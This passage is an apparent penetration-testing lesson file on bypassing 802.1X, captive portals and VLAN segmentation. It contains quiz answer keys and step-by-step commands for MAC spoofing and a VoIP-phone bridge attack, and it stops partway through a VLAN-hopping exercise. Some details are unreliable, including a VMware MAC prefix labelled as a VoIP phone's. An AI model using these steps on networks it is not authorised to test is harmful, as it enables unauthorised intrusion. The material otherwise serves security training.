{
  "lesson_id": "f8e7d6c5-b4a3-4928-a1b0-9f8e7d6c5b4a",
  "domain": "pentest",
  "title": "Network Access Control Evasion",
  "difficulty": 3,
  "order_index": 142,
  "prerequisites": [],
  "concepts": [
    "802.1X authentication bypass techniques",
    "NAC evasion through MAC spoofing and VLAN hopping",
    "Captive portal bypass methods",
    "Network segmentation bypass",
    "Port security evasion"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Understand NAC architectures and their security limitations",
    "Bypass 802.1X authentication using various techniques",
    "Evade network segmentation controls through VLAN manipulation",
    "Circumvent captive portals and guest network restrictions",
    "Test and exploit port-based access control weaknesses"
  ],
  "post_assessment": [
    {
      "question_id": "nac-001",
      "question": "What is the primary vulnerability exploited when using MAC spoofing to bypass 802.1X authentication?",
      "options": [
        "The switch doesn't verify MAC addresses",
        "The authenticator allows multiple devices on a single port after initial authentication",
        "The RADIUS server is misconfigured",
        "The supplicant software has a buffer overflow"
      ],
      "correct_answer": 1,
      "explanation": "802.1X typically authenticates the first device on a port. Once authenticated, many implementations allow additional devices with different MAC addresses to communicate on the same port without re-authentication. This is called 'multi-host mode' and is the primary weakness exploited by MAC spoofing attacks.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "nac-002",
      "question": "You've connected to a network with 802.1X enabled. Running 'tcpdump -i eth0 -e' shows EAPoL frames. What does this indicate?",
      "options": [
        "The network uses WPA2 encryption",
        "802.1X authentication is actively running on this port",
        "The switch is in bypass mode",
        "You've successfully bypassed NAC"
      ],
      "correct_answer": 1,
      "explanation": "EAPoL (Extensible Authentication Protocol over LAN) frames are used by 802.1X for authentication. Seeing these frames indicates 802.1X is active on the port. You would need to complete authentication (or bypass it) to access the network. If you were already bypassed, you'd see normal traffic, not EAPoL frames.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "nac-003",
      "question": "During a pentest, you discover a VoIP phone authenticated via 802.1X on a port. Which technique would be MOST effective for gaining network access?",
      "options": [
        "ARP poisoning the phone",
        "Creating a bridge between your laptop and the phone, spoofing the phone's MAC on your interface",
        "Brute-forcing the 802.1X password",
        "Sending deauth frames to the phone"
      ],
      "correct_answer": 1,
      "explanation": "The 'VoIP phone bridge' attack is highly effective. You physically insert your device between the phone and the switch port, then bridge the connection. By spoofing the phone's MAC address on your attacking interface, you piggyback on the phone's authenticated session. The phone continues to work (avoiding suspicion), and you gain network access. This exploits the multi-host mode vulnerability of 802.1X.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "nac-004",
      "question": "You encounter a captive portal that requires email verification. After entering your email, you receive a verification link but the portal still blocks you. What is the MOST likely cause?",
      "options": [
        "The portal checks for HTTP User-Agent strings",
        "Your MAC address is blacklisted",
        "The portal uses DNS-based filtering that hasn't been updated yet",
        "The verification link expired"
      ],
      "correct_answer": 2,
      "explanation": "Many captive portals use DNS-based filtering. When you click the verification link, it updates a database, but the DNS resolver may still have cached records pointing to the captive portal. This creates a delay (minutes) before access is granted. Flushing DNS cache or changing DNS servers can sometimes accelerate this. User-Agent checks are less common, and blacklisting wouldn't allow you to receive the email in the first place.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "nac-005",
      "question": "A network uses dynamic VLAN assignment based on 802.1X authentication results. Which attack would allow you to access a different VLAN than assigned?",
      "options": [
        "VLAN double-tagging (Q-in-Q)",
        "MAC flooding",
        "DHCP starvation",
        "STP manipulation"
      ],
      "correct_answer": 0,
      "explanation": "VLAN double-tagging (802.1Q-in-Q) allows an attacker to inject frames into another VLAN. By sending frames with two VLAN tags, the first switch strips the outer tag (your assigned VLAN), and the inner tag causes the next switch to forward the frame to a different VLAN. This bypasses the VLAN segmentation enforced by NAC. MAC flooding affects CAM tables, DHCP starvation exhausts IP addresses, and STP manipulation targets spanning tree - none directly allow VLAN hopping like double-tagging.",
      "type": "multiple_choice",
      "difficulty": 3
    }
  ],
  "jim_kwik_principles": [
    "teach_like_im_10",
    "active_learning",
    "memory_hooks",
    "connect_to_what_i_know",
    "minimum_effective_dose",
    "multiple_memory_pathways",
    "meta_learning",
    "gamify_it"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "# Welcome to Network Access Control Evasion! üîìüåê\n\nYou're about to learn one of the **most critical penetration testing skills**: bypassing network access controls (NAC) that organizations rely on to keep unauthorized users out.\n\n**Why does this matter?**\n\nOrganizations spend millions on NAC solutions:\n- üõ°Ô∏è **802.1X authentication** (port-based access control)\n- üîí **Captive portals** (guest WiFi, hotel networks)\n- üì° **VLAN segmentation** (isolate sensitive networks)\n- üö™ **Port security** (MAC-based filtering)\n\n**But here's the reality**:\n\n‚ùå **NAC is often misconfigured** (default settings leave gaps)  \n‚ùå **Legacy protocols have design flaws** (802.1X multi-host mode)  \n‚ùå **Physical access = game over** (VoIP phone bridge attacks)  \n‚ùå **Convenience beats security** (captive portals with weak validation)\n\n**Real-world impact**:\n\n**Target breach (2013)**: Attackers bypassed NAC by compromising an HVAC vendor's credentials. Once inside the \"vendor\" VLAN, they pivoted to the payment network. NAC didn't stop lateral movement.\n\n**Typical pentest**: 70% of organizations with 802.1X have bypass-able configurations. Why? Because perfect NAC deployment is rare, and attackers only need one weakness.\n\n**What you'll master today**:\n\n‚úÖ 802.1X bypass (MAC spoofing, VoIP phone bridge, hub insertion)  \n‚úÖ VLAN hopping (double-tagging, switch spoofing)  \n‚úÖ Captive portal evasion (MAC cloning, DNS tunneling)  \n‚úÖ Port security circumvention (CAM table overflow)  \n‚úÖ Physical attacks (inline taps, network implants)\n\n**Skills you'll gain**:\n\nüéØ **Reconnaissance**: Identify NAC type and configuration  \nüîç **Exploitation**: Execute bypass techniques  \nüìä **Reporting**: Document findings for remediation  \nüí™ **Defense**: Understand how to properly configure NAC\n\n**Career relevance**:\n\n- **Penetration testers**: 802.1X bypass is tested on ~50% of network pentests\n- **Red teamers**: Physical access + NAC evasion = initial foothold\n- **Security architects**: Understand weaknesses to design better controls\n\n**This lesson is rated \"Advanced\" (difficulty 3)** because:\n- Requires networking knowledge (802.1X, VLANs, switching)\n- Involves low-level protocol manipulation\n- Hands-on tools: Scapy, Yersinia, macchanger, hostapd-wpe\n\n**But don't worry** - we'll build up from fundamentals to advanced attacks.\n\nLet's learn how to test NAC security and expose weaknesses before attackers do! üöÄ"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Teach Me Like I'm 10: What is NAC and Why Bypass It?\n\n## The Nightclub Analogy\n\nImagine a nightclub with a bouncer (security guard) at the door:\n\n### Normal Security (No NAC)\n\n**Old way**: The door is unlocked. Anyone can walk in.\n\n```\nAttacker ‚Üí Walks right in ‚Üí Accesses everything\n```\n\n**Problem**: No security at all!\n\n### NAC Security (With a Bouncer)\n\n**With NAC**: There's a bouncer checking IDs.\n\n```\nPerson ‚Üí Shows ID to bouncer ‚Üí Bouncer checks list ‚Üí Allows entry (or denies)\n```\n\nIn networking terms:\n- **Person** = Your device (laptop, phone)\n- **ID** = MAC address or credentials (username/password)\n- **Bouncer** = Network Access Control (802.1X switch)\n- **List** = Authentication server (RADIUS)\n\n**NAC checks**: \"Are you allowed on this network?\"\n\n### How Attackers Bypass NAC (Like Sneaking Into the Club)\n\n**Method 1: Fake ID (MAC Spoofing)**\n\n```\nAttacker watches who gets in ‚Üí Copies their ID ‚Üí Uses fake ID to enter\n```\n\nIn networking:\n- Watch network traffic\n- See someone's MAC address (like seeing their ID)\n- Change your MAC to match theirs\n- Bouncer thinks you're that person!\n\n**Method 2: Follow Someone In (Piggyback Attack)**\n\n```\nBouncer checks first person ‚Üí Opens door ‚Üí Attacker sneaks in behind them\n```\n\nIn networking:\n- VoIP phone gets authenticated by 802.1X\n- Attacker connects between phone and switch\n- Phone keeps working (so bouncer doesn't notice)\n- Attacker rides along on the authenticated connection\n\n**Method 3: Use the Service Entrance (VLAN Hopping)**\n\n```\nBouncer guards front door ‚Üí Attacker finds service entrance ‚Üí Walks right in\n```\n\nIn networking:\n- Bouncer (NAC) puts you in a \"guest\" VLAN (restricted area)\n- You use VLAN hopping tricks\n- You access the \"VIP\" VLAN (server network)\n- Bouncer never knew you switched areas\n\n**Method 4: Bribe the Bouncer (Compromise the NAC System)**\n\n```\nAttacker hacks the bouncer's checklist ‚Üí Adds their name ‚Üí Walks in legitimately\n```\n\nIn networking:\n- Compromise the RADIUS server (authentication database)\n- Add your credentials\n- NAC lets you in (thinks you're authorized)\n\n## Why Is This Possible?\n\n**Reason 1: Bouncers aren't perfect**\n\n- They check the first person, then sometimes get lazy\n- They don't recheck everyone constantly\n- They trust the ID without verifying it's real\n\n**In NAC terms**:\n- 802.1X authenticates the **first** device on a port\n- After that, it often allows other devices (multi-host mode)\n- It trusts MAC addresses (which are easy to fake)\n\n**Reason 2: Convenience beats security**\n\n- Clubs want people to get in fast (long lines are bad for business)\n- So they cut corners (check IDs quickly, don't verify thoroughly)\n\n**In NAC terms**:\n- Companies enable \"guest\" VLANs (so visitors can access WiFi)\n- They allow VoIP phones to authenticate (for business calls)\n- These conveniences create bypass opportunities\n\n**Reason 3: Old security systems**\n\n- The bouncer system was designed 20 years ago\n- Back then, fake IDs were rare\n- Now, attackers have better tools\n\n**In NAC terms**:\n- 802.1X was designed in 2001\n- It assumed MAC addresses couldn't be easily spoofed\n- It assumed one device = one port (before VMs and containers)\n\n## The Key Insight\n\n**NAC tries to be a bouncer, but**:\n\n‚ùå It checks once, not continuously  \n‚ùå It trusts IDs (MAC addresses) that are easy to fake  \n‚ùå It has side doors (VoIP phones, printers, guest networks)  \n‚ùå It prioritizes convenience over perfect security\n\n**Your job as a pentester**: Find the side doors and show the organization how to lock them.\n\nNow let's learn the technical details of these attacks! üòä"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Understanding Network Access Control (NAC)\n\n## What is NAC?\n\n**Network Access Control (NAC)** is a security solution that enforces policies on devices attempting to access a network. It controls:\n\n- **Who** can access the network (authentication)\n- **What** they can access (authorization)\n- **When** they can access it (time-based policies)\n- **Where** they're placed (VLAN assignment)\n\n### NAC Architectures\n\n**1. Port-Based NAC (802.1X)**\n\n```\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ              802.1X Architecture                        ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ                                                         ‚îÇ\n‚îÇ  Device (Supplicant)                                    ‚îÇ\n‚îÇ       ‚îÇ                                                 ‚îÇ\n‚îÇ       ‚îÇ EAPoL frames                                    ‚îÇ\n‚îÇ       ‚Üì                                                 ‚îÇ\n‚îÇ  Switch (Authenticator)                                 ‚îÇ\n‚îÇ       ‚îÇ                                                 ‚îÇ\n‚îÇ       ‚îÇ RADIUS (AAA protocol)                           ‚îÇ\n‚îÇ       ‚Üì                                                 ‚îÇ\n‚îÇ  RADIUS Server (Authentication Server)                  ‚îÇ\n‚îÇ       ‚îÇ                                                 ‚îÇ\n‚îÇ       ‚îÇ Success/Failure + VLAN assignment               ‚îÇ\n‚îÇ       ‚Üì                                                 ‚îÇ\n‚îÇ  Switch ‚Üí Grants or denies port access                  ‚îÇ\n‚îÇ                                                         ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n```\n\n**Components**:\n\n- **Supplicant**: Client software requesting network access (e.g., wpa_supplicant on Linux)\n- **Authenticator**: Network switch enforcing authentication\n- **Authentication Server**: RADIUS/TACACS+ server validating credentials\n\n**How it works**:\n\n1. Device connects to switch port\n2. Switch port is in **unauthorized state** (only EAPoL traffic allowed)\n3. Supplicant sends credentials via EAPoL\n4. Switch forwards to RADIUS server\n5. RADIUS validates credentials\n6. If successful: Port moves to **authorized state**, VLAN assigned\n7. If failed: Port remains blocked\n\n**2. Inline NAC (Appliance-Based)**\n\n```\nDevice ‚Üí NAC Appliance ‚Üí Network\n            ‚Üì\n       Policy Check:\n       - OS version?\n       - Antivirus updated?\n       - Patches current?\n       - Posture compliant?\n```\n\n**How it works**: All traffic passes through a NAC appliance that:\n- Profiles the device (OS fingerprinting)\n- Checks compliance (antivirus, patches)\n- Quarantines non-compliant devices\n- Grants access to compliant devices\n\n**3. Out-of-Band NAC (VLAN-Based)**\n\n```\nDevice ‚Üí Switch ‚Üí NAC Controller (monitors SNMP/NetFlow)\n            ‚Üì\n       VLAN assignment:\n       - Compliant ‚Üí Production VLAN\n       - Non-compliant ‚Üí Quarantine VLAN\n       - Guest ‚Üí Guest VLAN\n```\n\n**How it works**: NAC doesn't sit in the traffic path. Instead:\n- Monitors network via SNMP, NetFlow, or SPAN ports\n- Instructs switches to change VLAN assignments\n- Uses dynamic VLAN assignment for segmentation\n\n**4. Captive Portal**\n\n```\nDevice connects ‚Üí DHCP assigns IP ‚Üí DNS/HTTP redirected to portal\n    ‚Üì\nUser enters credentials/accepts terms\n    ‚Üì\nPortal updates firewall rules ‚Üí Access granted\n```\n\n**Common in**: Guest WiFi, hotels, airports, coffee shops\n\n---\n\n## 802.1X Deep Dive\n\n### EAP (Extensible Authentication Protocol)\n\nEAP is the authentication framework used by 802.1X. Common types:\n\n**EAP-TLS** (Transport Layer Security):\n- **Authentication**: Mutual certificate-based (client + server)\n- **Security**: Strongest (requires PKI infrastructure)\n- **Weakness**: Complex to deploy (certificate management)\n\n**EAP-TTLS** (Tunneled TLS):\n- **Authentication**: Server certificate + client password\n- **Security**: Strong (encrypted tunnel for password)\n- **Weakness**: Vulnerable to rogue AP attacks if users ignore certificate warnings\n\n**PEAP** (Protected EAP):\n- **Authentication**: Similar to EAP-TTLS (server cert + password)\n- **Security**: Moderate (encrypted tunnel)\n- **Weakness**: Same as EAP-TTLS (rogue AP attacks)\n\n**EAP-MD5** (Message Digest 5):\n- **Authentication**: Hash-based challenge-response\n- **Security**: ‚ö†Ô∏è WEAK - No encryption, vulnerable to dictionary attacks\n- **Status**: Deprecated, but still found in legacy environments\n\n### 802.1X Packet Flow\n\n```\nSupplicant                Authenticator (Switch)      RADIUS Server\n    |                              |                         |\n    |--- EAPoL-Start ------------‚Üí|                         |\n    |                              |                         |\n    |‚Üê-- EAP-Request/Identity ----|                         |\n    |                              |                         |\n    |--- EAP-Response/Identity -‚Üí|                         |\n    |                              |--- RADIUS Access-Req -‚Üí|\n    |                              |                         |\n    |                              |‚Üê-- RADIUS Challenge ----|\n    |‚Üê-- EAP-Request/Challenge ---|                         |\n    |                              |                         |\n    |--- EAP-Response/Auth ------‚Üí|                         |\n    |                              |--- RADIUS Access-Req -‚Üí|\n    |                              |                         |\n    |                              |‚Üê-- RADIUS Access-Accept-|\n    |                              |    (+ VLAN assignment)  |\n    |‚Üê-- EAP-Success -------------|                         |\n    |                              |                         |\n    |===== Port Authorized ====================================|\n    |                              |                         |\n```\n\n**Key phases**:\n\n1. **Initialization**: EAPoL-Start (supplicant announces presence)\n2. **Negotiation**: EAP type negotiation (which EAP method to use?)\n3. **Authentication**: Credential exchange (encrypted in TLS tunnel for PEAP/TTLS)\n4. **Authorization**: RADIUS returns VLAN assignment, ACLs\n5. **Accounting**: RADIUS tracks session (start time, bandwidth, duration)\n\n### 802.1X Port Modes\n\n**Single-Host Mode** (most secure):\n```\nPort: [Authenticated device ONLY]\n- Only ONE MAC address allowed\n- Re-authentication required if device changes\n```\n\n**Multi-Host Mode** (‚ö†Ô∏è VULNERABLE):\n```\nPort: [First device authenticated] + [Any other devices]\n- First device authenticates via 802.1X\n- Additional devices bypass authentication\n- Common weakness exploited by attackers\n```\n\n**Multi-Domain Mode** (VoIP + PC):\n```\nPort: [VoIP Phone (Voice VLAN)] + [PC (Data VLAN)]\n- Allows one voice device + one data device\n- Common in office environments\n- Exploitable via VoIP phone bridge attack\n```\n\n**MAC Authentication Bypass (MAB)**:\n```\nPort: [Device doesn't support 802.1X]\n      ‚Üì\n      Switch uses MAC as username/password to RADIUS\n      ‚Üì\n      RADIUS checks if MAC is authorized\n```\n\n**Why MAB is used**: Legacy devices (printers, IP cameras) don't support 802.1X supplicant software.\n\n**MAB weakness**: MAC addresses are trivial to spoof.\n\n---\n\n## VLAN-Based Segmentation\n\n### Dynamic VLAN Assignment\n\n802.1X can assign different VLANs based on authentication results:\n\n```\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ         RADIUS-Based VLAN Assignment                    ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ                                                         ‚îÇ\n‚îÇ  User: alice@company.com                                ‚îÇ\n‚îÇ       ‚Üì                                                 ‚îÇ\n‚îÇ  RADIUS checks user group                               ‚îÇ\n‚îÇ       ‚Üì                                                 ‚îÇ\n‚îÇ  Group: Employees                                       ‚îÇ\n‚îÇ       ‚Üì                                                 ‚îÇ\n‚îÇ  RADIUS returns: VLAN 100 (Corporate LAN)               ‚îÇ\n‚îÇ                                                         ‚îÇ\n‚îÇ  ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ   ‚îÇ\n‚îÇ                                                         ‚îÇ\n‚îÇ  User: guest@visitor.com                                ‚îÇ\n‚îÇ       ‚Üì                                                 ‚îÇ\n‚îÇ  RADIUS checks user group                               ‚îÇ\n‚îÇ       ‚Üì                                                 ‚îÇ\n‚îÇ  Group: Guests                                          ‚îÇ\n‚îÇ       ‚Üì                                                 ‚îÇ\n‚îÇ  RADIUS returns: VLAN 999 (Guest Network)               ‚îÇ\n‚îÇ                                                         ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n```\n\n**VLAN isolation**: Different VLANs can't communicate without routing through a firewall.\n\n**Security benefit**: Compromised guest device can't access corporate servers.\n\n**Attack vector**: VLAN hopping bypasses this isolation.\n\n---\n\n## Captive Portals\n\n### How Captive Portals Work\n\n```\n1. Device connects to WiFi/Ethernet\n2. DHCP assigns IP (usually 10.x.x.x or 192.168.x.x)\n3. Device tries to reach internet (e.g., http://google.com)\n4. DNS/HTTP traffic intercepted by portal\n5. Browser redirected to http://portal.local/login\n6. User enters credentials or accepts terms\n7. Portal updates firewall (allows device MAC/IP)\n8. Device can now access internet\n```\n\n**Detection methods**:\n\n- **HTTP redirect**: Portal intercepts HTTP requests, returns 302 redirect\n- **DNS redirect**: Portal intercepts DNS queries, returns portal IP\n- **Hybrid**: Both HTTP and DNS interception\n\n**Validation methods**:\n\n- **Email verification**: User enters email, clicks link\n- **SMS verification**: User enters phone number, enters code\n- **Social login**: OAuth (\"Sign in with Google/Facebook\")\n- **Payment**: Credit card for paid WiFi\n- **Terms acceptance**: Click \"I agree\" (no authentication)\n\n**Bypass opportunities**:\n\n- MAC cloning (copy authorized device's MAC)\n- DNS tunneling (exfiltrate data via DNS queries)\n- SSL/TLS bypass (HTTPS isn't intercepted by some portals)\n- Time-based (MAC authorization expires after X hours)\n\n---\n\n## NAC Weaknesses Summary\n\n| NAC Type | Primary Weakness | Bypass Technique |\n|----------|------------------|------------------|\n| 802.1X | Multi-host mode | MAC spoofing, VoIP bridge |\n| 802.1X | MAB fallback | Spoof whitelisted MAC (printer) |\n| VLAN segmentation | Misconfigured trunking | VLAN hopping (double-tag) |\n| Captive portal | MAC-based tracking | Clone authorized MAC |\n| Port security | Static MAC limits | CAM table overflow |\n| Inline NAC | Single point of failure | Physical bypass (unplug NAC) |\n\nNext: Hands-on attack techniques!"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On: NAC Evasion Techniques\n\n## Exercise 1: Reconnaissance - Identify NAC Type\n\n### Step 1: Check for 802.1X (EAPoL Frames)\n\n```bash\n# Connect Ethernet cable to target network\n# Listen for EAPoL frames (802.1X authentication)\n\nsudo tcpdump -i eth0 -e -n 'ether proto 0x888e'\n\n# Output if 802.1X is active:\n# 12:34:56.789 00:11:22:33:44:55 > 01:80:c2:00:00:03, EAPoL, Request, Identity\n# 12:34:56.890 01:80:c2:00:00:03 > 00:11:22:33:44:55, EAPoL, Response, Identity\n\n# If you see EAPoL frames: 802.1X is enabled\n# If no frames after 30 seconds: No 802.1X (or port is pre-authenticated)\n```\n\n**Interpretation**:\n\n- **EAPoL frames present**: 802.1X is enforcing authentication\n- **No EAPoL frames**: Either:\n  - No NAC (open network)\n  - MAC Authentication Bypass (MAB) mode\n  - Port already authenticated by previous device\n\n### Step 2: Identify Authorized Devices\n\n```bash\n# Passive reconnaissance: Listen for ARP traffic\n# Authorized devices will be sending ARP requests\n\nsudo tcpdump -i eth0 -e -n arp\n\n# Output:\n# 12:35:01.234 aa:bb:cc:dd:ee:ff > Broadcast, ARP, Request who-has 192.168.1.1 tell 192.168.1.100\n# 12:35:01.456 00:0c:29:3a:5b:7c > aa:bb:cc:dd:ee:ff, ARP, Reply 192.168.1.1 is-at 00:0c:29:3a:5b:7c\n\n# Look for:\n# - VoIP phones (MAC OUI: 00:0c:29, 00:04:f2, etc.)\n# - Printers (MAC OUI: 00:1b:a9, 00:21:5a, etc.)\n# - Authorized workstations\n\n# Save MACs for spoofing:\necho \"aa:bb:cc:dd:ee:ff\" > authorized_macs.txt\n```\n\n### Step 3: Test for Captive Portal\n\n```bash\n# Try to reach internet (will be redirected if portal exists)\n\ncurl -I http://www.msftconnecttest.com/connecttest.txt\n\n# Output if captive portal:\n# HTTP/1.1 302 Found\n# Location: http://portal.company.com/login?mac=aa:bb:cc:dd:ee:ff\n\n# No redirect = no captive portal (or you're pre-authorized)\n```\n\n---\n\n## Exercise 2: 802.1X Bypass via MAC Spoofing\n\n### Scenario: Multi-Host Mode Exploitation\n\n**Goal**: Bypass 802.1X by spoofing an authorized device's MAC address.\n\n### Step 1: Identify Authorized MAC\n\n```bash\n# From previous recon, we found: aa:bb:cc:dd:ee:ff (VoIP phone)\n\n# Verify it's actively communicating:\nsudo tcpdump -i eth0 -e -n 'host aa:bb:cc:dd:ee:ff' -c 10\n\n# If you see traffic: This MAC is authorized\n```\n\n### Step 2: Spoof MAC Address\n\n```bash\n# Bring interface down\nsudo ip link set eth0 down\n\n# Change MAC to authorized device\nsudo ip link set dev eth0 address aa:bb:cc:dd:ee:ff\n\n# Bring interface up\nsudo ip link set eth0 up\n\n# Verify MAC changed:\nip link show eth0 | grep ether\n# Output: link/ether aa:bb:cc:dd:ee:ff brd ff:ff:ff:ff:ff:ff\n```\n\n### Step 3: Request IP via DHCP\n\n```bash\n# Release old IP (if any)\nsudo dhclient -r eth0\n\n# Request new IP with spoofed MAC\nsudo dhclient -v eth0\n\n# Output:\n# DHCPDISCOVER on eth0 to 255.255.255.255 port 67\n# DHCPOFFER from 192.168.1.1\n# DHCPREQUEST on eth0 to 255.255.255.255 port 67\n# DHCPACK from 192.168.1.1\n# bound to 192.168.1.100 -- renewal in 3600 seconds\n```\n\n### Step 4: Test Network Access\n\n```bash\n# Ping gateway\nping -c 4 192.168.1.1\n\n# If successful: You've bypassed 802.1X!\n\n# Try to reach internet\ncurl -I https://www.google.com\n\n# HTTP/1.1 200 OK = Full access\n# No response = Limited access (VLAN restriction)\n```\n\n**Why this works**: Multi-host mode allows multiple MACs on the same port after initial authentication. The switch sees your spoofed MAC and allows traffic.\n\n---\n\n## Exercise 3: VoIP Phone Bridge Attack\n\n### Scenario: Physical Access to Office\n\n**Setup**:\n- VoIP phone authenticated via 802.1X on desk\n- You have physical access to the phone's Ethernet cable\n- Phone uses multi-domain mode (voice + data VLANs)\n\n### Required Hardware:\n\n- Laptop with Ethernet adapter\n- USB Ethernet adapter (to create two interfaces: eth0, eth1)\n- Two Ethernet cables\n\n### Architecture:\n\n```\nSwitch Port ‚Üê‚îÄ‚îÄ‚îÄ‚Üí [Your Laptop] ‚Üê‚îÄ‚îÄ‚îÄ‚Üí VoIP Phone\n                     eth0              eth1\n                  (to switch)      (to phone)\n```\n\n### Step 1: Create Network Bridge\n\n```bash\n# Install bridge utilities\nsudo apt-get install bridge-utils\n\n# Create bridge interface\nsudo brctl addbr br0\n\n# Add both interfaces to bridge\nsudo brctl addif br0 eth0  # Interface to switch\nsudo brctl addif br0 eth1  # Interface to phone\n\n# Bring up bridge\nsudo ip link set br0 up\nsudo ip link set eth0 up\nsudo ip link set eth1 up\n\n# Verify bridge:\nbrctl show\n# Output:\n# bridge name    bridge id              STP enabled    interfaces\n# br0            8000.aabbccddeeff      no             eth0\n#                                                      eth1\n```\n\n### Step 2: Spoof VoIP Phone MAC on Data VLAN\n\n```bash\n# Capture VoIP phone's MAC (watch traffic on eth1)\nsudo tcpdump -i eth1 -e -n -c 10\n\n# Identify phone MAC: 00:0c:29:3a:5b:7c\n\n# Create virtual interface on bridge with phone's MAC\nsudo ip link add link br0 name br0.100 type vlan id 100\nsudo ip link set dev br0.100 address 00:0c:29:3a:5b:7c\nsudo ip link set br0.100 up\n\n# Request IP on data VLAN\nsudo dhclient -v br0.100\n```\n\n### Step 3: Verify Access\n\n```bash\n# Check if phone still works (make a test call)\n# If phone works: Bridge is transparent\n\n# Check your laptop's network access:\nping -I br0.100 -c 4 192.168.1.1\ncurl -I https://www.google.com\n\n# Success: You're on the corporate network!\n```\n\n**Why this works**: \n- Phone remains authenticated (continues to work)\n- You insert yourself in the middle (transparent bridge)\n- You piggyback on the phone's authenticated session\n- Switch sees both phone traffic and your traffic as \"authorized\"\n\n---\n\n## Exercise 4: VLAN Hopping (Double-Tagging)\n\n### Scenario: Dynamic VLAN Assignment\n\n**Setup**:\n- You're authenticated to Guest VLAN (VLAN 999)\n- Corporate servers are in VLAN 